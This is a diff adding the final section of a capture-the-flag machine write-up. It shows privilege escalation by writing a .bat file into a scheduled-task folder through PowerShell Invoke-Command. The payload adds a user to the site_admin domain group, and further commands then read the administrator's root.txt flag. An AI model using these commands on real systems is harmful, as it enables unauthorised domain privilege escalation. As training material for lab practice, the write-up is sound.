@@ -269,3 +269,44 @@ REM This is run every 5 minutes. For Lois use ONLY
 
 Let me break it down any file ending with `.bat` would run every 5 min since we are in the `keepmeon` folder so it possible to create a payload in a `bat` format which can give access to `lois` now back to the doc file we got first.
 
+
+![image](https://user-images.githubusercontent.com/69868171/156222328-bc6f961b-79ff-4eec-b37a-f1a3ebc1a27b.png)
+
+
+```
+**Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin. **
+```
+
+Now let add user `awallace` to the group of `site_admin` and wait for 5min to confirm it.
+
+```
+Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156223085-0fa6688e-c353-4314-bc2b-39645790680d.png)
+
+Now we can confirm if user `awallace` is now part of `site_admin` group.
+
+![image](https://user-images.githubusercontent.com/69868171/156224915-d788e766-9af6-4dd3-a4fb-dcc79bd92309.png)
+
+```
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {net group site_admin} -credential $cred
+```
+
+Now we are part of `site_admin` group time to get the `root.txt` flag.
+
+![image](https://user-images.githubusercontent.com/69868171/156225282-e1993f28-7da7-469b-be10-dd315520122d.png)
+
+```
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /users/administrator/desktop} -credential $cred
+
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {cat /users/administrator/desktop/root.txt} -credential $cred
+
+```
+ahhhh finally we are done.
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
